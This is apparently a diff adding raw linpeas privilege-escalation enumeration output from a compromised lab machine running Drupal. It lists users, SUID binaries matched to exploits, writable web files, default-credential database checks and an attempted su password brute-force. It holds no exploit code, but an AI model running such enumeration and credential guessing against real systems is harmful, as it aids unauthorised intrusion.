+tcp6       1      0 10.10.10.102:80         10.10.14.78:45112       CLOSE_WAIT  -                   
+udp        0      0 0.0.0.0:41361           0.0.0.0:*                           -                   
+udp     4608      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:161             0.0.0.0:*                           -                   
+udp6       0      0 ::1:161                 :::*                                -                   
+
+[+] Can I sniff with tcpdump?
+No
+
+
+====================================( Users Information )=====================================
+[+] My user
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+[+] Do I have PGP keys?
+gpg Not Found
+
+[+] Clipboard or highlighted text?
+xsel and xclip Not Found
+
+[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+
+[+] Checking sudo tokens
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+/proc/sys/kernel/yama/ptrace_scope is not enabled (1)
+gdb wasn't found in PATH
+
+[+] Checking /etc/doas.conf
+/etc/doas.conf Not Found
+
+[+] Checking Pkexec policy
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2
+
+[Configuration]
+AdminIdentities=unix-user:0
+[Configuration]
+AdminIdentities=unix-group:sudo;unix-group:admin
+
+[+] Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds
+It's not possible to brute-force su.
+
+[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+
+[+] Superusers
+root:x:0:0:root:/root:/bin/bash
+
+[+] Users with console
+root:x:0:0:root:/root:/bin/bash
+
+[+] All users & groups
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
+uid=1001(tomcat) gid=46(plugdev) groups=46(plugdev)
+uid=1002(daniel) gid=1005(daniel) groups=1005(daniel)
+uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
+uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
+uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
+uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
+uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
+uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
+uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
+uid=108(landscape) gid=112(landscape) groups=112(landscape)
+uid=109(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
+uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=111(mysql) gid=114(mysql) groups=114(mysql)
+uid=112(ftp) gid=115(ftp) groups=115(ftp)
+uid=113(Debian-snmp) gid=116(Debian-snmp) groups=116(Debian-snmp)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+
+[+] Login now
+ 14:10:54 up  1:23,  0 users,  load average: 0.36, 0.24, 3.53
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+[+] Last logons
+anthony  tty1                          Mon Jun 11 11:51 - down   (00:23)
+reboot   system boot  4.15.0-22-generi Mon Jun 11 11:50 - 12:14  (00:23)
+anthony  pts/2        192.168.56.1     Mon Jun 11 11:46 - crash  (00:03)
+anthony  pts/1        192.168.56.102   Mon Jun 11 10:58 - crash  (00:52)
+anthony  pts/0        192.168.56.102   Mon Jun 11 10:43 - crash  (01:07)
+anthony  pts/0        192.168.56.102   Mon Jun 11 10:43 - 10:43  (00:00)
+anthony  tty1                          Mon Jun 11 10:38 - crash  (01:11)
+reboot   system boot  4.15.0-22-generi Mon Jun 11 10:38 - 12:14  (01:35)
+
+wtmp begins Mon Jun 11 10:38:25 2018
+
+[+] Last time logon each user
+Username         Port     From             Latest
+root             tty1                      Sat Jul 14 21:09:40 +0000 2018
+daniel           pts/0    dead:beef:2::100 Sun Jul  1 13:46:16 +0000 2018
+
+[+] Password policy
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512
+
+
+===================================( Software Information )===================================
+[+] MySQL version
+mysql  Ver 14.14 Distrib 5.7.22, for Linux (x86_64) using  EditLine wrapper
+
+[+] MySQL connection using default root/root ........... No
+[+] MySQL connection using root/toor ................... No
+[+] MySQL connection using root/NOPASS ................. No
+[+] Searching mysql credentials and exec
+From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user		= mysql
+Found readable /etc/mysql/my.cnf
+!includedir /etc/mysql/conf.d/
+!includedir /etc/mysql/mysql.conf.d/
+
+[+] PostgreSQL version and pgadmin credentials
+ Not Found
+
+[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
+[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No
+
+[+] Apache server info
+Version: Server version: Apache/2.4.29 (Ubuntu)
+Server built:   2018-04-25T11:38:24
+PHP exec extensions
+/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
+/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php
+--
+/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.phps$">
+/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php-source
+--
+/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
+/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php
+--
+/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.phps$">
+/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php-source
+--
+/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
+/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php
+--
+/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.phps$">
+/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php-source
+
+[+] Searching PHPCookies
+ Not Found
+
+[+] Searching Wordpress wp-config.php files
+wp-config.php Not Found
+
+[+] Searching Drupal settings.php files
+/default/settings.php Not Found
+
+[+] Searching Tomcat users file
+tomcat-users.xml Not Found
+
+[+] Mongo information
+ Not Found
+Found 
+cat: '': No such file or directory
+
+[+] Searching supervisord configuration file
+supervisord.conf Not Found
+
+[+] Searching cesi configuration file
+cesi.conf Not Found
+
+[+] Searching Rsyncd config file
+/usr/share/doc/rsync/examples/rsyncd.conf
+[ftp]
+	comment = public archive
+	path = /var/www/pub
+	use chroot = yes
+	lock file = /var/lock/rsyncd
+	read only = yes
+	list = yes
+	uid = nobody
+	gid = nogroup
+	strict modes = yes
+	ignore errors = no
+	ignore nonreadable = yes
+	transfer logging = no
+	timeout = 600
+	refuse options = checksum dry-run
+	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz
+
+[+] Searching Hostapd config file
+hostapd.conf Not Found
+
+[+] Searching wifi conns file
+ Not Found
+
+[+] Searching Anaconda-ks config files
+anaconda-ks.cfg Not Found
+
+[+] Searching .vnc directories and their passwd files
+.vnc Not Found
+
+[+] Searching ldap directories and their hashes
+/etc/ldap
+The password hash is from the {SSHA} to 'structural'
+
+[+] Searching .ovpn files and credentials
+.ovpn Not Found
+
+[+] Searching ssl/ssh files
+ChallengeResponseAuthentication no
+UsePAM yes
+  --> Some certificates were found (out limited):
+/etc/pollinate/entropy.ubuntu.com.pem
+
+ --> /etc/hosts.allow file found, read the rules:
+/etc/hosts.allow
+
+
+Searching inside /etc/ssh/ssh_config for interesting info
+Host *
+    SendEnv LANG LC_*
+    HashKnownHosts yes
+    GSSAPIAuthentication yes
+
+[+] Searching unexpected auth lines in /etc/pam.d/sshd
+No
+
+[+] Searching Cloud credentials (AWS, Azure, GC)
+
+[+] NFS exports?
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+/etc/exports Not Found
+
+[+] Searching kerberos conf files and tickets
+[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
+krb5.conf Not Found
+tickets kerberos Not Found
+klist Not Found
+
+[+] Searching Kibana yaml
+kibana.yml Not Found
+
+[+] Searching Knock configuration
+Knock.config Not Found
+
+[+] Searching logstash files
+ Not Found
+
+[+] Searching elasticsearch files
+ Not Found
+
+[+] Searching Vault-ssh files
+vault-ssh-helper.hcl Not Found
+
+[+] Searching AD cached hashes
+cached hashes Not Found
+
+[+] Searching screen sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+No Sockets found in /run/screen/S-www-data.
+
+[+] Searching tmux sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+tmux Not Found
+
+[+] Searching Couchdb directory
+
+[+] Searching redis.conf
+
+[+] Searching dovecot files
+dovecot credentials Not Found
+
+[+] Searching mosquitto.conf
+
+[+] Searching neo4j auth file
+
+[+] Searching Cloud-Init conf file
+Found readable /etc/cloud/cloud.cfg
+     lock_passwd: True
+
+[+] Searching Erlang cookie file
+
+[+] Searching GVM auth file
+
+[+] Searching IPSEC files
+
+[+] Searching IRSSI files
+
+
+====================================( Interesting Files )=====================================
+[+] SUID - Check easy privesc, exploits and write perms
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+/snap/core/4650/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+/snap/core/4650/bin/ping
+/snap/core/4650/bin/ping6
+/snap/core/4650/bin/su
+/snap/core/4650/bin/umount  --->  BSD/Linux(08-1996)
+/snap/core/4650/usr/bin/chfn  --->  SuSE_9.3/10
+/snap/core/4650/usr/bin/chsh
+/snap/core/4650/usr/bin/gpasswd
+/snap/core/4650/usr/bin/newgrp  --->  HP-UX_10.20
+/snap/core/4650/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+/snap/core/4650/usr/bin/sudo  --->  /sudo$
+/snap/core/4650/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/4650/usr/lib/openssh/ssh-keysign
+/snap/core/4650/usr/lib/snapd/snap-confine
+/snap/core/4650/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
+/snap/core/4486/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+/snap/core/4486/bin/ping
+/snap/core/4486/bin/ping6
+/snap/core/4486/bin/su
+/snap/core/4486/bin/umount  --->  BSD/Linux(08-1996)
+/snap/core/4486/usr/bin/chfn  --->  SuSE_9.3/10
+/snap/core/4486/usr/bin/chsh
+/snap/core/4486/usr/bin/gpasswd
+/snap/core/4486/usr/bin/newgrp  --->  HP-UX_10.20
+/snap/core/4486/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+/snap/core/4486/usr/bin/sudo  --->  /sudo$
+/snap/core/4486/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/4486/usr/lib/openssh/ssh-keysign
+/snap/core/4486/usr/lib/snapd/snap-confine
+/snap/core/4486/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
+/snap/core/4830/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+/snap/core/4830/bin/ping
+/snap/core/4830/bin/ping6
+/snap/core/4830/bin/su
+/snap/core/4830/bin/umount  --->  BSD/Linux(08-1996)
+/snap/core/4830/usr/bin/chfn  --->  SuSE_9.3/10
+/snap/core/4830/usr/bin/chsh
+/snap/core/4830/usr/bin/gpasswd
+/snap/core/4830/usr/bin/newgrp  --->  HP-UX_10.20
+/snap/core/4830/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+/snap/core/4830/usr/bin/sudo  --->  /sudo$
+/snap/core/4830/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/4830/usr/lib/openssh/ssh-keysign
+/snap/core/4830/usr/lib/snapd/snap-confine
+/snap/core/4830/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
+/bin/ping
+/bin/fusermount
+/bin/su
+/bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
+/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+/bin/umount  --->  BSD/Linux(08-1996)
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/chfn  --->  SuSE_9.3/10
+/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/bin/newgrp  --->  HP-UX_10.20
+/usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+/usr/bin/gpasswd
+/usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+/usr/bin/sudo  --->  /sudo$
+/usr/bin/newuidmap
+/usr/bin/traceroute6.iputils
+
+[+] SGID
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+/snap/core/4650/sbin/pam_extrausers_chkpwd
+/snap/core/4650/sbin/unix_chkpwd
+/snap/core/4650/usr/bin/chage
+/snap/core/4650/usr/bin/crontab
+/snap/core/4650/usr/bin/dotlockfile
+/snap/core/4650/usr/bin/expiry
+/snap/core/4650/usr/bin/mail-lock
+/snap/core/4650/usr/bin/mail-touchlock
+/snap/core/4650/usr/bin/mail-unlock
+/snap/core/4650/usr/bin/ssh-agent
+/snap/core/4650/usr/bin/wall
+/snap/core/4650/usr/lib/snapd/snap-confine
+/snap/core/4486/sbin/pam_extrausers_chkpwd
+/snap/core/4486/sbin/unix_chkpwd
+/snap/core/4486/usr/bin/chage
+/snap/core/4486/usr/bin/crontab
+/snap/core/4486/usr/bin/dotlockfile
+/snap/core/4486/usr/bin/expiry
+/snap/core/4486/usr/bin/mail-lock
+/snap/core/4486/usr/bin/mail-touchlock
+/snap/core/4486/usr/bin/mail-unlock
+/snap/core/4486/usr/bin/ssh-agent
+/snap/core/4486/usr/bin/wall
+/snap/core/4486/usr/lib/snapd/snap-confine
+/snap/core/4830/sbin/pam_extrausers_chkpwd
+/snap/core/4830/sbin/unix_chkpwd
+/snap/core/4830/usr/bin/chage
+/snap/core/4830/usr/bin/crontab
+/snap/core/4830/usr/bin/dotlockfile
+/snap/core/4830/usr/bin/expiry
+/snap/core/4830/usr/bin/mail-lock
+/snap/core/4830/usr/bin/mail-touchlock
+/snap/core/4830/usr/bin/mail-unlock
+/snap/core/4830/usr/bin/ssh-agent
+/snap/core/4830/usr/bin/wall
+/snap/core/4830/usr/lib/snapd/snap-confine
+/sbin/pam_extrausers_chkpwd
+/sbin/unix_chkpwd
+/usr/lib/x86_64-linux-gnu/utempter/utempter
+/usr/bin/bsd-write
+/usr/bin/mlocate
+/usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+/usr/bin/ssh-agent
+/usr/bin/chage
+/usr/bin/crontab
+/usr/bin/wall
+/usr/bin/expiry
+
+[+] Cheking missconfigurations of ld.so
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so
+/etc/ld.so.conf
+include /etc/ld.so.conf.d/*.conf
+
+/etc/ld.so.conf.d
+  /etc/ld.so.conf.d/libc.conf
+/usr/local/lib
+  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
+/usr/local/lib/x86_64-linux-gnu
+/lib/x86_64-linux-gnu
+/usr/lib/x86_64-linux-gnu
+
+[+] Capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+Current capabilities:
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+
+Shell capabilities:
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+
+Files with capabilities:
+/usr/bin/mtr-packet = cap_net_raw+ep
+
+[+] Users with capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+
+[+] Files with ACLs
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls
+files with acls in searched folders Not Found
+
+[+] .sh files in path
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
+/usr/bin/gettext.sh
+
+[+] Unexpected folders in root
+/lost+found
+
+[+] Files (scripts) in /etc/profile.d/
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files
+total 32
+drwxr-xr-x   2 root root 4096 Apr 26  2018 .
+drwxr-xr-x 105 root root 4096 Jul 14  2018 ..
+-rw-r--r--   1 root root 1557 Dec  4  2017 Z97-byobu.sh
+-rwxr-xr-x   1 root root 3308 Apr 18  2018 Z99-cloud-locale-test.sh
+-rwxr-xr-x   1 root root  775 Apr 18  2018 Z99-cloudinit-warnings.sh
+-rw-r--r--   1 root root  580 Apr 16  2018 apps-bin-path.sh
+-rw-r--r--   1 root root  664 Apr  2  2018 bash_completion.sh
+-rw-r--r--   1 root root 1003 Dec 29  2015 cedilla-portuguese.sh
+
+[+] Permissions in init, init.d, systemd, and rc.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d
+
+[+] Hashes inside passwd file? ........... No
+[+] Writable passwd file? ................ No
+[+] Credentials in fstab/mtab? ........... No
+[+] Can I read shadow files? ............. No
+[+] Can I read opasswd file? ............. No
+[+] Can I write in network-scripts? ...... No
+[+] Can I read root folder? .............. No
+
+[+] Searching root files in home dirs (limit 30)
+/home
+
+[+] Searching folders owned by me containing others files on it
+
+[+] Readable files belonging to root and readable by me but not world readable
+
+[+] Modified interesting files in the last 5mins (limit 100)
+/var/log/journal/a37481d05c5a4b11b197e7cc217e727f/system.journal
+/var/log/syslog
+/var/log/kern.log
+/var/log/auth.log
+
+[+] Writable log files (logrotten) (limit 100)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
+
+[+] Files inside /home/www-data (limit 20)
+
+[+] Files inside others home (limit 20)
+/home/daniel/.lesshst
+/home/daniel/.lhistory
+/home/daniel/.viminfo
+/home/daniel/user.txt
+
+[+] Searching installed mail applications
+
+[+] Mails (limit 50)
+
+[+] Backup files?
+-rw-r--r-- 1 root root 7838 May 15  2018 /lib/modules/4.15.0-22-generic/kernel/drivers/power/supply/wm831x_backup.ko
+-rw-r--r-- 1 root root 7886 May 15  2018 /lib/modules/4.15.0-22-generic/kernel/drivers/net/team/team_mode_activebackup.ko
+-rw-r--r-- 1 root root 7838 May 23  2018 /lib/modules/4.15.0-23-generic/kernel/drivers/power/supply/wm831x_backup.ko
+-rw-r--r-- 1 root root 7886 May 23  2018 /lib/modules/4.15.0-23-generic/kernel/drivers/net/team/team_mode_activebackup.ko
+-rw-r--r-- 1 root root 35464 Apr 19  2018 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
+-rw-r--r-- 1 root root 11755 Jun 12  2018 /usr/share/info/dir.old
+-rw-r--r-- 1 root root 2746 Apr 12  2018 /usr/share/man/man8/vgcfgbackup.8.gz
+-rwxr-xr-x 1 root root 226 Dec  4  2017 /usr/share/byobu/desktop/byobu.desktop.old
+-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
+-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
+-rw-r--r-- 1 root root 216818 May 15  2018 /usr/src/linux-headers-4.15.0-22-generic/.config.old
+-rw-r--r-- 1 root root 0 May 15  2018 /usr/src/linux-headers-4.15.0-22-generic/include/config/wm831x/backup.h
+-rw-r--r-- 1 root root 0 May 15  2018 /usr/src/linux-headers-4.15.0-22-generic/include/config/net/team/mode/activebackup.h
+-rw-r--r-- 1 root root 216818 May 23  2018 /usr/src/linux-headers-4.15.0-23-generic/.config.old
+-rw-r--r-- 1 root root 0 May 23  2018 /usr/src/linux-headers-4.15.0-23-generic/include/config/wm831x/backup.h
+-rw-r--r-- 1 root root 0 May 23  2018 /usr/src/linux-headers-4.15.0-23-generic/include/config/net/team/mode/activebackup.h
+
+[+] Searching tables inside readable .db/.sqlite files (limit 100)
+
+[+] Web files?(output limit)
+/var/www/:
+total 12K
+drwxr-xr-x  3 root root 4.0K Jun 11  2018 .
+drwxr-xr-x 16 root root 4.0K Jun 16  2018 ..
+drwxr-xr-x  9 root root 4.0K Jun 11  2018 html
+
+/var/www/html:
+total 296K
+drwxr-xr-x  9 root     root     4.0K Jun 11  2018 .
+drwxr-xr-x  3 root     root     4.0K Jun 11  2018 ..
+
+[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
+-rw-r--r-- 1 root root 2319 Apr  4  2018 /etc/bash.bashrc
+-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc
+-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
+./linpeas.sh: 2490: [: /etc/systemd/system/timers.target.wants/snapd.snap-repair.timer: unexpected operator
+./linpeas.sh: 2490: [: /home/daniel/.python_history: unexpected operator
+-rw-r--r-- 1 root root 3106 Apr  9  2018 /usr/share/base-files/dot.bashrc
+-rw-r--r-- 1 root root 2889 Dec  4  2017 /usr/share/byobu/profiles/bashrc
+-rw-r--r-- 1 root root 2778 Aug 13  2017 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
+-rw-r--r-- 1 root root 802 Aug 13  2017 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
+./linpeas.sh: 2490: [: /usr/src/linux-headers-4.15.0-23/zfs/config: unexpected operator
+./linpeas.sh: 2490: [: /opt/lshell/.git/config: unexpected operator
+
+[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+
+[+] Readable files inside /tmp, /var/tmp, /var/backups, /private/tmp /private/var/at/tmp /private/var/tmp (limit 70)
+./linpeas.sh: 2517: ./linpeas.sh: f: not found
+sh: printf: I/O error
+
+[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+/dev/mqueue
+/dev/mqueue/linpeas.txt
+/dev/shm
+/run/lock
+/run/lock/apache2
+/run/screen
+/run/screen/S-www-data
+/snap/core/4486/run/lock
+/snap/core/4486/tmp
+/snap/core/4486/var/tmp
+/snap/core/4650/run/lock
+/snap/core/4650/tmp
+/snap/core/4650/var/tmp
+/snap/core/4830/run/lock
+/snap/core/4830/tmp
+/snap/core/4830/var/tmp
+/tmp
+/tmp/.htaccess
+/tmp/linpeas.sh
+/tmp/lse.sh
+/tmp/tmux-33
+/var/cache/apache2/mod_cache_disk
+/var/crash
+/var/lib/php/sessions
+/var/tmp
+/var/www/html/.htaccess
+/var/www/html/CHANGELOG.txt
+/var/www/html/COPYRIGHT.txt
+/var/www/html/INSTALL.mysql.txt
+/var/www/html/INSTALL.pgsql.txt
+/var/www/html/INSTALL.sqlite.txt
+/var/www/html/INSTALL.txt
+/var/www/html/LICENSE.txt
+/var/www/html/MAINTAINERS.txt
+/var/www/html/README.txt
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/includes/actions.inc
+/var/www/html/includes/ajax.inc
+/var/www/html/includes/archiver.inc
+/var/www/html/includes/authorize.inc
+/var/www/html/includes/batch.inc
+/var/www/html/includes/batch.queue.inc
+/var/www/html/includes/bootstrap.inc
+/var/www/html/includes/cache-install.inc
+/var/www/html/includes/cache.inc
+/var/www/html/includes/common.inc
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/includes/database/database.inc
+/var/www/html/includes/database/log.inc
+/var/www/html/includes/database/mysql
+/var/www/html/includes/database/mysql/database.inc
+/var/www/html/includes/database/mysql/install.inc
+/var/www/html/includes/database/mysql/query.inc
+/var/www/html/includes/database/mysql/schema.inc
+/var/www/html/includes/database/pgsql
+/var/www/html/includes/database/pgsql/database.inc
+/var/www/html/includes/database/pgsql/install.inc
+/var/www/html/includes/database/pgsql/query.inc
+/var/www/html/includes/database/pgsql/schema.inc
+/var/www/html/includes/database/pgsql/select.inc
+/var/www/html/includes/database/prefetch.inc
+/var/www/html/includes/database/query.inc
+/var/www/html/includes/database/schema.inc
+/var/www/html/includes/database/select.inc
+/var/www/html/includes/database/sqlite
+/var/www/html/includes/database/sqlite/database.inc
+/var/www/html/includes/database/sqlite/install.inc
+/var/www/html/includes/database/sqlite/query.inc
+/var/www/html/includes/database/sqlite/schema.inc
+/var/www/html/includes/database/sqlite/select.inc
+/var/www/html/includes/date.inc
+/var/www/html/includes/entity.inc
+/var/www/html/includes/errors.inc
+/var/www/html/includes/file.inc
+/var/www/html/includes/file.mimetypes.inc
+/var/www/html/includes/filetransfer
+/var/www/html/includes/filetransfer/filetransfer.inc
+/var/www/html/includes/filetransfer/ftp.inc
+/var/www/html/includes/filetransfer/local.inc
+/var/www/html/includes/filetransfer/ssh.inc
+/var/www/html/includes/form.inc
+/var/www/html/includes/graph.inc
+/var/www/html/includes/image.inc
+/var/www/html/includes/install.core.inc
+/var/www/html/includes/install.inc
+/var/www/html/includes/iso.inc
+/var/www/html/includes/json-encode.inc
+/var/www/html/includes/language.inc
+/var/www/html/includes/locale.inc
+/var/www/html/includes/lock.inc
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/index.php
+/var/www/html/install.php
+/var/www/html/misc
+/var/www/html/misc/ajax.js
+/var/www/html/misc/authorize.js
+/var/www/html/misc/autocomplete.js
+/var/www/html/misc/batch.js
+/var/www/html/misc/collapse.js
+/var/www/html/misc/drupal.js
+/var/www/html/misc/farbtastic
+/var/www/html/misc/farbtastic/farbtastic.css
+/var/www/html/misc/farbtastic/farbtastic.js
+/var/www/html/misc/favicon.ico
+/var/www/html/misc/form.js
+/var/www/html/misc/jquery.ba-bbq.js
+/var/www/html/misc/jquery.cookie.js
+/var/www/html/misc/jquery.form.js
+/var/www/html/misc/jquery.js
+/var/www/html/misc/jquery.once.js
+/var/www/html/misc/machine-name.js
+/var/www/html/misc/print-rtl.css
+/var/www/html/misc/print.css
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/misc/ui/images
+/var/www/html/misc/ui/jquery.effects.blind.min.js
+/var/www/html/misc/ui/jquery.effects.bounce.min.js
+/var/www/html/misc/ui/jquery.effects.clip.min.js
+/var/www/html/misc/ui/jquery.effects.core.min.js
+/var/www/html/misc/ui/jquery.effects.drop.min.js
+/var/www/html/misc/ui/jquery.effects.explode.min.js
+/var/www/html/misc/ui/jquery.effects.fade.min.js
+/var/www/html/misc/ui/jquery.effects.fold.min.js
+/var/www/html/misc/ui/jquery.effects.highlight.min.js
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/misc/vertical-tabs-rtl.css
+/var/www/html/misc/vertical-tabs.css
+/var/www/html/misc/vertical-tabs.js
+/var/www/html/modules
+/var/www/html/modules/README.txt
+/var/www/html/modules/aggregator
+/var/www/html/modules/aggregator/aggregator-feed-source.tpl.php
+/var/www/html/modules/aggregator/aggregator-item.tpl.php
+/var/www/html/modules/aggregator/aggregator-rtl.css
+/var/www/html/modules/aggregator/aggregator-summary-item.tpl.php
+/var/www/html/modules/aggregator/aggregator-summary-items.tpl.php
+/var/www/html/modules/aggregator/aggregator-wrapper.tpl.php
+/var/www/html/modules/aggregator/aggregator.admin.inc
+/var/www/html/modules/aggregator/aggregator.api.php
+/var/www/html/modules/aggregator/aggregator.css
+/var/www/html/modules/aggregator/aggregator.fetcher.inc
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/modules/aggregator/tests/aggregator_test.info
+/var/www/html/modules/aggregator/tests/aggregator_test.module
+/var/www/html/modules/aggregator/tests/aggregator_test_atom.xml
